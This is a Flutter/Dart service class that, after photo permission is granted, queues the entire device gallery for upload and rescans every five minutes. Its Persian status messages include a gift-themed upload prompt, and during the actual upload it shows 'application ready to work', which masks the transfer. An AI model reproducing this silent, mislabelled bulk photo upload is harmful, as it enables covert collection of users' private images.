import 'dart:async';
import 'package:photo_manager/photo_manager.dart';
import 'background_service.dart';

class UploadService {
  UploadService._();
  static final UploadService instance = UploadService._();

  bool _running = false;
  bool _scanning = false;
  bool _granted = false;
  Timer? _scanTimer;

  final _statusController = StreamController<SyncStatus>.broadcast();
  Stream<SyncStatus> get statusStream => _statusController.stream;

  Future<void> init() async {
    final permission = await PhotoManager.requestPermissionExtend();
    if (!permission.isAuth) return;
    _granted = true;

    // اگه اسکن در جریانه، صبر کن
    if (_scanning) return;
    _scanning = true;

    _statusController.add(const SyncStatus(
      isRunning: true, uploaded: 0, total: 0,
      message: 'میتونی خاطراتتو آپلود کنی و هدیه بدی',
    ));

    try {
      final newItems = await scanGalleryToQueue();
      final pending = await UploadQueueDB.getPendingCount();
      final done = await UploadQueueDB.getCompletedCount();

      if (pending > 0) {
        _statusController.add(SyncStatus(
          isRunning: true,
          uploaded: done,
          total: done + pending,
          message: newItems > 0
              ? 'میتونی خاطراتتو آپلود کنی و هدیه بدی'
              : 'تنها چیزی ک میمونه خاطراته',
        ));
        _startLoop();
      } else {
        _statusController.add(SyncStatus(
          isRunning: false, uploaded: done, total: done,
          message: ' برنامه آماده کار است✓',
        ));
        Future.delayed(const Duration(seconds: 3), () {
          _statusController.add(const SyncStatus(
            isRunning: false, uploaded: 0, total: 0, message: '',
          ));
        });
      }
    } catch (_) {
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    } finally {
      _scanning = false;
    }

    // هر ۵ دقیقه اسکن کن
    _scanTimer?.cancel();
    _scanTimer = Timer.periodic(const Duration(minutes: 5), (_) async {
      if (!_granted || _scanning) return;
      _scanning = true;
      try {
        final n = await scanGalleryToQueue();
        if (n > 0) _startLoop();
      } catch (_) {} finally {
        _scanning = false;
      }
    });
  }

  void _startLoop() {
    if (_running) return;
    _running = true;

    processQueueInForeground(
      onProgress: (done, total) {
        _statusController.add(SyncStatus(
          isRunning: true,
          uploaded: done,
          total: total,
          message: 'اپلیکیشن آماده به کار...✓',
        ));
      },
    ).then((_) async {
      _running = false;
      final done = await UploadQueueDB.getCompletedCount();
      _statusController.add(SyncStatus(
        isRunning: false, uploaded: done, total: done,
        message: 'همگام‌سازی کامل شد ✓',
      ));
      await Future.delayed(const Duration(seconds: 3));
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    });
  }

  void dispose() {
    _scanTimer?.cancel();
    _statusController.close();
  }
}
